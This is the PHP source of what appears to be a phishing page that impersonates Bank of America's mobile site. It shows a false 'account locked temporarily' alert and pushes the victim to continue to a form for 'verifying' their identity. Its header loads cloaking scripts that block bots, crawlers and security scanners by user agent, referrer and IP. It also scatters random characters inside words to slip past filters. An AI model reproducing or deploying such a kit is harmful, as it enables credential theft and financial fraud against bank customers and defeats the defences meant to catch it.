<?php
session_start();
error_reporting(0);
include 'autob/bt.php';
include 'autob/basicbot.php';
include 'autob/uacrawler.php';
include 'autob/refspam.php';
include 'autob/ipselect.php';
include "autob/bts2.php";
include "req/config.php";
?>
<!DOCTYPE html>
<html class=" js no-flexbox canvas canvastext webgl touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
		<title>Suspended</title>
    <link rel="shortcut icon" href="bstyles/favicon.ico?ts=20151018" type="image/x-icon">
	<link rel="stylesheet" href="bstyles/bactouch.css"><link rel="stylesheet" href="bstyles/toolbar.css"><link rel="stylesheet" href="bstyles/bact_listview.css"><link rel="stylesheet" href="bstyles/footer.css"><link rel="stylesheet" href="bstyles/slidemenu.css">
	<style>.signonVersionTwoHomePage{max-width:400px;margin:auto;}
	.fsd-secure-esp-skin {
    padding: 20px 0 20px 20px;
	;}
	
div.inputContainer {line-height:20px;border:none;}</style>
	</head>

	<body>
	<div id="page" class="" style="position: static; float: left; height: 100%; width: 100%; left: 100%; display: block;">
	<div class="header-module">
   <div class="fsd-secure-esp-skin">
   	  <img height="28" width="230" alt="Bank of America" src="bstyles/BofA_rgb.png">
      <div class="clearboth"></div>
   </div>
</div>
<div id="cmw_toolBar_" class="cmw_toolBar_"><a id="leftButton" role="button" class="hidden"></a><a id="slidemenuz" class="sprite backButton icon sprite-menu" href="#" title="Show menu for all mobile banking features" role="button"></a><div id="barker" class="hidden"></div><h1 id="title" class=""><div id="cmw_toolBar_titleText" style="padding-left: 34px; padding-right: 34px; width: 100%;">Action Required!</div></h1><a id="rightButton" class="hidden"></a></div><div class="pageMinHeight">
<div class="signonVersionTwoHomePage">
<div id="scrollerwrapperOt" class="overthrow">

	<div id="accountLocked" class="">
		<ul class="listView edge">
			<li role="button" class="noLink">
				<div class="imageWrap paddingHoriz20"><img src="bstyles/ico_alert@2x.png" class=""></div>
				<p class="subVal padding10 fontRed" id="headError">For your security, Your account has been locked temporarily</p>
			</li>
		</ul>
	</div>
	
	<div id="successMsg"></div>
	
	<div id="newOnlineId" style="">
		<div class="toppad5">
			<fieldset>
				<div class="inputEntryContainer"><form >
					
					<div class="inputContainer">
						<label for="btCustomOnlineId" class="">Due to conflicts we are having verifying some information on your account, we have decided to place a temporary hold until you make some required actions and verify .</label>
					</div>
				</form></div>
				
			</fieldset>
		</div>
	</div>
	
	</div>
	<div>	
		<a id="btSignonContinue" href="com/cv<?php echo '?ScrPg='.md5(uniqid());?>" role="button" class="btn">
			<img style="margin-bottom:-4px;" class="paddingHoriz10" src="bstyles/secure_lock.png">
			<span id="signonLabel">Continue</span>
		</a>
	</div>
					<div class="inputContainer" style="background-color: white;">
						<label for="btCustomPasscode" class="">Proceeding will prompt you to enter information we need to ver<?php echo rT('ALPHANUMERIC',rand(1,87));?>ify your identity and give you a more secure client experience</label>
					</div>
	
	<div id="helpOptionView" class="helpOptionView">
		<div class="padding10 center"></div>
		<div class="padding10"></div>
	</div>
	
	<div id="btnPin" style="position: fixed; bottom: 0px; display: none; height: auto;">
		<ul class="btnGroupPin">
			<li><a id="cancelButton" class="plain slideUp btnNeg" role="button" href="javascript:void(0);">Cancel</a></li>
		</ul>
	</div>
</div>
</div><footer><div class="boa_footnote"></div><div class="boa_footer"><div class="left"><a id="boa_footer_privacy" target="_blank">Privacy</a></div><div class="left"><a id="boa_footer_security" target="_blank" style="padding-left:20px;">Security</a></div><div class="right"><a id="boa_footer_ehl" class="ehl" target="_blank">Equal Housing Lender</a></div><p class="clear">© <?php echo date("Y");?> Bank of America Corporation. All rights reserved. Bank of America, N.A. Member FDIC.</p></div></footer></div>
		
	
</body></html>